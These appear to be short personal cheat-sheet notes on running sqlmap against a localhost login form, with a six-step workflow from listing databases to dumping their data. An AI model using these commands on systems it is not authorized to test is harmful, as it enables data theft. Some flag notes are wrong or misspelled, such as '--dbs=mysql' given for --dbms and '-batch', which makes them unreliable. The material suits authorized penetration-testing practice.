SQLMAP - testing tool used to detect and exploit SQL injection vulnerabilities in web applications

sqlmap -u "http://localhost/login.php" --method=POST --data="email=test@test.com&password=test123" --dbms=mysql --batch -D [DATABASE] -T [TABLE] 


NOTES
-----------------------------------------------------
--dbs=mysql 
  Limits testing to MySQL-specific payloads.
  Speeds up the scanning process by avoiding unnecessary checks for other database types.
  Reduces network traffic and false positives.

Use dummy credentials 

-----------------------------------------------------
IMPORTANT -
  --method=POST,GET 
  --data="email=test@gmail.com&password=password"
  -batch
    non-interactive mode, allowing sqlmap to run automatically without prompting the user for input

Safest workflow for black box backing

1	--dbs	          | List all databases
2	-D <database>	  | Select a specific database
3	--tables	      | List tables within the database
4	-T <table>	    | Select a table
5	--columns	      | View table columns
6	--dump	        | Extract data
